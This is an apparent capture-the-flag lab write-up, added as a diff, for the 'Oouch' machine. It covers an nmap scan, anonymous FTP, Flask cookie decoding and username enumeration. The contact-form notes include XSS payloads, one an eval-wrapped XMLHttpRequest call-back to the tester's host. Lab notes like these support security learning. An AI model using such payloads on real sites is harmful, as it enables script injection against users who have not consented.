@@ -1,0 +1,101 @@
+* Oouch
+** Enumeration
+*** meta
+# Nmap 7.80 scan initiated Sat May 23 02:34:28 2020 as: nmap -Pn -sC -sV -oA logs/nmap 10.10.10.177
+WARNING: Service 10.10.10.177:8000 had already soft-matched rtsp, but now soft-matched sip; ignoring second value
+Nmap scan report for 10.10.10.177
+Host is up (0.024s latency).
+Not shown: 996 closed ports
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+# Nmap done at Sat May 23 02:34:47 2020 -- 1 IP address (1 host up) scanned in 18.60 seconds
+*** 21/tcp   open  ftp     vsftpd 2.0.8 or later
+**** scan 
+| ftp-anon: Anonymous FTP login allowed (FTP code 230)
+|_-rw-r--r--    1 ftp      ftp            49 Feb 11 19:34 project.txt
+| ftp-syst: 
+|   STAT: 
+| FTP server status:
+|      Connected to 10.10.16.100
+|      Logged in as ftp
+|      TYPE: ASCII
+|      Session bandwidth limit in byte/s is 30000
+|      Session timeout in seconds is 300
+|      Control connection is plain text
+|      Data connections will be plain text
+|      At session startup, client count was 3
+|      vsFTPd 3.0.3 - secure, fast, stable
+|_End of status
+**** notes
+Anonymous FTP produces just one file, 'project.txt', which shows that there seem to be two websites, which matches what we see on the scan.
+*** 22/tcp   open  ssh     OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
+| ssh-hostkey: 
+|   2048 8d:6b:a7:2b:7a:21:9f:21:11:37:11:ed:50:4f:c6:1e (RSA)
+|_  256 d2:af:55:5c:06:0b:60:db:9c:78:47:b5:ca:f4:f1:04 (ED25519)
+*** 5000/tcp open  http    nginx 1.14.2
+**** scan
+|_http-server-header: nginx/1.14.2
+| http-title: Welcome to Oouch
+|_Requested resource was http://10.10.10.177:5000/login?next=%2F
+**** gobuster
+**** notes
+Page directs to a login page, we can register an account and login.
+Interesting behavior to be explored/attacked:
+ * reset password at ~/password_change~
+ * send a message at ~/contact~ -- possible XSS?
+ * the cookie, which is a normal flask session id cookie -- can we decrypt it?
+
+***** cookie
+The cookie is easily decryptable, with ~flask-cookie-decode~, but we won't be able to spoof it unless we know the flask secret key.
+
+Interestingly, it contains a listing of all the flashes sent in the session, along with a user id and csrf token.
+***** register
+Leaks usernames and emails by reporting when there is a duplicate.
+
+~admin~ / ~admin@oouch.htb~ are not existing credentials
+***** contact
+Haven't gotten anywhere with this so far, may need more enum to see how to attack it.
+~<script>alert('js');</script>~ triggers an error message and a refusal for 1 minute. ;)
+~eval(atob(btoa("req = new XMLHttpRequest();req.open('GET', 'http://10.10.16.100:8000/test.html');req.send()")))~ in the onclick of a link doesn't fail but it doesn't trigger a GET either.
+*** 8000/tcp open  rtsp
+**** scan
+| fingerprint-strings: 
+|   FourOhFourRequest, GetRequest, HTTPOptions: 
+|     HTTP/1.0 400 Bad Request
+|     Content-Type: text/html
+|     Vary: Authorization
+|     <h1>Bad Request (400)</h1>
+|   RTSPRequest: 
+|     RTSP/1.0 400 Bad Request
+|     Content-Type: text/html
+|     Vary: Authorization
+|     <h1>Bad Request (400)</h1>
+|   SIPOptions: 
+|     SIP/2.0 400 Bad Request
+|     Content-Type: text/html
+|     Vary: Authorization
+|_    <h1>Bad Request (400)</h1>
+|_http-title: Site doesn't have a title (text/html).
+|_rtsp-methods: ERROR: Script execution failed (use -d to debug)
+1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
+SF-Port8000-TCP:V=7.80%I=7%D=5/23%Time=5EC8C3FB%P=x86_64-pc-linux-gnu%r(Ge
+SF:tRequest,64,"HTTP/1\.0\x20400\x20Bad\x20Request\r\nContent-Type:\x20tex
+SF:t/html\r\nVary:\x20Authorization\r\n\r\n<h1>Bad\x20Request\x20\(400\)</
+SF:h1>")%r(FourOhFourRequest,64,"HTTP/1\.0\x20400\x20Bad\x20Request\r\nCon
+SF:tent-Type:\x20text/html\r\nVary:\x20Authorization\r\n\r\n<h1>Bad\x20Req
+SF:uest\x20\(400\)</h1>")%r(HTTPOptions,64,"HTTP/1\.0\x20400\x20Bad\x20Req
+SF:uest\r\nContent-Type:\x20text/html\r\nVary:\x20Authorization\r\n\r\n<h1
+SF:>Bad\x20Request\x20\(400\)</h1>")%r(RTSPRequest,64,"RTSP/1\.0\x20400\x2
+SF:0Bad\x20Request\r\nContent-Type:\x20text/html\r\nVary:\x20Authorization
+SF:\r\n\r\n<h1>Bad\x20Request\x20\(400\)</h1>")%r(SIPOptions,63,"SIP/2\.0\
+SF:x20400\x20Bad\x20Request\r\nContent-Type:\x20text/html\r\nVary:\x20Auth
+SF:orization\r\n\r\n<h1>Bad\x20Request\x20\(400\)</h1>");
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+**** notes
+responds to http, returns 400
+
+django buit oauth server? 
+https://django-oauth-toolkit.readthedocs.io/en/latest/index.html
+
+But no dice on comms with it.
+** Foothold
+** Escalation
